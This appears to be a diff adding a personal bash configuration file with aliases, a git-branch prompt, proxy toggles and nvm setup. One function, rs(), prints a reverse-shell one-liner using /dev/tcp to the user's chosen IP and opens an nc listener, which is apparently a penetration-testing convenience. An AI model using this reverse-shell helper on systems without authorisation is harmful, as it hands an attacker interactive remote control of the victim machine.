@@ -1,0 +1,70 @@
+#!/usr/bin/env bash
+#
+# ~/.bashrc
+#
+# shellcheck disable=SC2155,SC1091
+# shellcheck source=/home/cnboonhan/.bashrc
+
+export EDITOR=vim
+set -o vi
+
+# If not running interactively, don't do anything
+[[ $- != *i* ]] && return
+
+alias ls='ls --color=auto'
+
+{ [ -f /usr/share/bash-completion/bash_completion ] && . "/usr/share/bash-completion/bash_completion"; } ||
+    echo "No bash completion available"
+
+## Helper function for PS1 modification to see git branch in terminal prompt
+parse-git-branch() {
+    git branch 2>/dev/null | sed -e '/^[^*]/d' -e 's/* \(.*\)/(\1)/'
+}
+
+get_battery() {
+    /usr/bin/cat "$(find /sys/class/power_supply/ | grep BAT | head -1)/capacity" 2>/dev/null || echo 100
+}
+
+git-pull-all() {
+    find . -type d -name .git -exec sh -c 'i="$1"; cd $i/../ && pwd && git stash > /dev/null && git pull' _ {} \;
+}
+
+ch(){
+  HOME=$PWD
+}
+
+hc(){
+  HOME=/home/$USER
+}
+
+socks(){
+  PORT="${1:-1080}"
+  gsettings set org.gnome.system.proxy mode 'manual'
+  gsettings set org.gnome.system.proxy.socks port "$PORT"
+  gsettings set org.gnome.system.proxy.socks host 'localhost'
+  gsettings set org.gnome.system.proxy ignore-hosts "['localhost', '127.0.0.0/8', '::1']"
+}
+
+unsocks(){
+  gsettings set org.gnome.system.proxy mode 'auto'
+}
+
+rs(){
+  PORT=${1:-1337}
+  IPS=($(ip -o addr | awk '!/^[0-9]*: ?lo|link\/ether/ {gsub("/", " "); print $2" "$4}' | awk '{ print $2 }'))
+  echo "Select Reverse Shell Bind IP"
+  select IP in "${IPS[@]}";
+  do
+    echo "You selected $IP"
+    echo "Run the following command: bash -i >& /dev/tcp/$IP/$PORT 0>&1"
+  done
+  nc -nvlk "$PORT"
+}
+
+export GPG_TTY=$(tty)
+export PS1='\[\e[1m\]\[\e[34m\]\u@\h [$(get_battery)]:\w \[\e[91m\]$(parse-git-branch) \[\e[0m\]$ '
+export GIT_DISCOVERY_ACROSS_FILESYSTEM=1
+
+[ -d "$HOME/.nvm" ] && 
+    export NVM_DIR="$([ -z "${XDG_CONFIG_HOME-}" ] && printf %s "${HOME}/.nvm" || printf %s "${XDG_CONFIG_HOME}/nvm")" &&
+    [ -s "$NVM_DIR/nvm.sh" ] && \. "$NVM_DIR/nvm.sh"
